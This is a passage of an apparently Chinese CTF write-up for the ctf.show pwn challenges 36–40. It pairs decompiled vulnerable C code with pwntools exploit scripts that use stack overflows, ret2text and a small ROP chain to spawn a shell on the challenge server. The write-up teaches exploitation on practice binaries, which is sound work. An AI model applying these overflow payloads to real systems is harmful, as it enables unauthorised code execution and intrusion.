+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-28h]</span>
+
+  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-4Ch]</span>
+  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-Ch]</span>
+
+  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048800<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag: No such file or directory."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>使用 <code>gets</code> 函数从标准输入读取一行字符串，并将其存储在 <code>s</code> 数组中。然后，返回指向 <code>s</code> 的指针。 <code>gets</code> 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出<code>s</code> 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，<code>s</code>距<code>ebp</code>仅有<code>0x28</code>，而<code>gets</code>不限制输入长度  </p>
+<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag。  </p>
+<pre class="language-assembly" data-language="assembly"><code class="language-assembly">text:08048586                 public get_flag  # get_flag地址</code></pre>
+
+<p><img src="pwn36_s.png" loading="lazy"></p>
+<p>Exp:</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token number">28110</span><span class="token punctuation">)</span>
+<span class="token comment"># io = process('./../Challenge/ctfshow_pwn/pwn36')</span>
+
+get_flag_add <span class="token operator">=</span> <span class="token number">0x08048586</span>
+s_offset <span class="token operator">=</span> <span class="token number">0x28</span><span class="token operator">+</span><span class="token number">0x4</span>
+payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>s_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>get_flag_add<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"want:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<h4 id="pwn37-ret2text"><a href="#pwn37-ret2text" class="headerlink" title="pwn37(ret2text)"></a>pwn37(ret2text)</h4><p><img src="pwn37_checksec.png" loading="lazy"></p>
+<p>32位程序，关闭了栈保护与PIE  </p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Just very easy ret2text&amp;&amp;32bit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [esp+6h] [ebp-12h]</span>
+
+  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>首先声明了一个名为 buf 的字符数组，大小为14字节它距离ebp的距离为0x12，这里通过read函数buf能读入0x32 ，转换为10进制就是50个字节的数据，因此这里很明显就存在栈溢出了，在找到漏洞点后，很明显看到左边有一个backdoor函数，跟进查看：  </p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p><img src="pwn37.png" loading="lazy"></p>
+<p>Exp:</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+<span class="token comment"># io = process("/home/hsad/CTF/Challenge/ctfshow_pwn/pwn37")</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token number">28159</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/hsad/CTF/Challenge/ctfshow_pwn/pwn37"</span><span class="token punctuation">)</span>
+bin_sh <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'backdoor'</span><span class="token punctuation">]</span>
+<span class="token comment"># print(hex(bin_sh))</span>
+<span class="token comment"># bin_sh = 0x08048521</span>
+buf_offset <span class="token operator">=</span> <span class="token number">0x12</span><span class="token operator">+</span><span class="token number">0x4</span>
+payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>buf_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"bit"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<h4 id="pwn38-堆栈平衡"><a href="#pwn38-堆栈平衡" class="headerlink" title="pwn38(堆栈平衡)"></a>pwn38(堆栈平衡)</h4><p><img src="pwn38_checksec.png" loading="lazy"></p>
+<p>64位 部分Relro保护 </p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400890<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400910<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_4009A0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400A30<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400AB8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400B50<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Stack_Overflow                                          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : It has system and '/bin/sh'.There is a backdoor function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Just easy ret2text&amp;&amp;64bit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string">"Just easy ret2text&amp;&amp;64bit"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p><img src="pwn38_buf.png" loading="lazy"></p>
+<p>也有后门 不过这次是64位程序 这里考到了栈帧平衡</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15996874.html">关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hu_c_t_f/article/details/131902515">关于pwn64位amd构造payload时的堆栈平衡问题以及32位与64位构造payload的区别与注意事项</a></p>
+<p><img src="pwn38_ret.png" loading="lazy"></p>
+<p>Exp:</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token number">28312</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/hsad/CTF/Challenge/ctfshow_pwn/pwn38"</span><span class="token punctuation">)</span>
+
+buf_offset <span class="token operator">=</span> <span class="token number">0xA</span><span class="token operator">+</span><span class="token number">0x8</span>
+bin_sh <span class="token operator">=</span> <span class="token number">0x0400657</span>
+ret <span class="token operator">=</span> <span class="token number">0x040066D</span>
+lea <span class="token operator">=</span> <span class="token number">0x040065B</span>
+<span class="token comment"># payload = cyclic(buf_offset)+p64(ret)+p64(bin_sh)</span>
+payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>buf_offset<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>lea<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"bit"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<h4 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h4><p><img src="pwn39_checksec.png" loading="lazy"></p>
+<p>32位程序，关闭了栈保护与PIE  </p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_804876C<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80487E0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_804885C<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80488E8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048978<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80489FC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048A90<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048B54<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Stack_Overflow                                          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : It has system and '/bin/sh',but they don't work together"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Just easy ret2text&amp;&amp;32bit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ctfshow</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span>
+<span class="token class-name">ssize_t</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [esp+6h] [ebp-12h]</span>
+
+  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">hint</span></span>
+<span class="token keyword">int</span> <span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 'You find me?'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>直接利用给出的<code>/bin/sh</code>传参就行</p>
+<p>可以用ida直接看地址 也可以利用gdb和objdump得到（objdump -d -j .plt pwn</p>
+<p><img src="pwn39_system.png" loading="lazy"></p>
+<p><img src="pwn39_binsh.png" loading="lazy"></p>
+<p>Exp:</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token number">28173</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/hsad/CTF/Challenge/ctfshow_pwn/pwn39"</span><span class="token punctuation">)</span>
+buf_offset <span class="token operator">=</span> <span class="token number">0x12</span><span class="token operator">+</span><span class="token number">0x4</span>
+<span class="token comment"># system = elf.sym['system']</span>
+system <span class="token operator">=</span> <span class="token number">0x080483A0</span>
+bin_sh <span class="token operator">=</span> <span class="token number">0x08048750</span>
+payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>buf_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>cyclic<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"bit"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<h4 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h4><p><img src="pwn40_checksec.png" loading="lazy"></p>
+<p>64位 部分Relro保护</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400828<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_4008A0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400920<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_4009B0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400A40<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400AC8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400B60<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Stack_Overflow                                          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : It has system and '/bin/sh',but they don't work together"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Just easy ret2text&amp;&amp;64bit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string">"Just easy ret2text&amp;&amp;64bit"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>跟上一题一样 不过是64</p>
+<p>64位和32位不同，参数不是直接放在栈上，而是优先放在寄存器rdi,rsi,rdx,rcx,r8,r9。这几个寄存器放不下时才会考虑栈。  </p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">具体64位传参方式如下：
+当参数少于7个时， 参数从左到右放⼊寄存器: rdi, rsi, rdx, rcx, r8, r9。
+当参数为7个以上时， 前 6 个与前⾯⼀样， 但后⾯的依次从 “右向左” 放⼊栈中，和32位汇编⼀样。
+</code></pre>
+
+<p>寻找<code>pop rdi;ret</code>  </p>
+<pre class="language-assembly" data-language="assembly"><code class="language-assembly">❯ ROPgadget --binary pwn40 --only &quot;pop|ret&quot;
+Gadgets information
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004007e0 : pop r14 ; pop r15 ; ret
+0x00000000004007e2 : pop r15 ; ret
+0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004005b8 : pop rbp ; ret
+0x00000000004007e3 : pop rdi ; ret
+0x00000000004007e1 : pop rsi ; pop r15 ; ret
+0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004004fe : ret
+0x000000000040069a : ret 0x2019
+
+Unique gadgets found: 12</code></pre>
+
+<pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>buf_offset<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre>
+
+<p>对每个部分进行逐步解释：</p>
+<ul>
+<li><p><strong>cyclic(buf_offset)</strong> : 填充缓冲区，达到溢出栈帧的目的。</p>
+</li>
+<li><p><strong>p64(pop_rdi)</strong> : 这部分使用 p64 函数将 pop_rdi 的地址转换为一个8字节的字符串。pop_rdi 指令用于将值从栈上弹出并存储到寄存器rdi中。在这个payload中，它用于准备传递给 system 函数的第一个参数。</p>
+</li>
+<li><p><strong>p64(bin_sh)</strong> : 这部分使用 p64 函数将 bin_sh 的地址转换为一个8字节的字符串。 bin_sh 通常是指向包含要执行的命令的字符串（如 &#x2F;bin&#x2F;sh ）的指针。该字符串将作为 system 函数的第一个参数。</p>
+</li>
+<li><p><strong>p64(ret)</strong> : 这部分使用 p64 函数将 ret 的地址转换为一个8字节的字符串。 ret 是一个返回指令，用于将程序控制权返回到栈上保存的地址。在这个payload中，它被用作一个间接跳转指令，用于绕过栈中的返回地址，以达到执行 system 函数的目的。</p>
+</li>
+<li><p><strong>p64(system)</strong> : 这部分使用 p64 函数将 system 的函数地址转换为一个8字节的字符串。system 是一个函数指针，指向一个可以执行系统命令的函数。</p>
+</li>
+</ul>
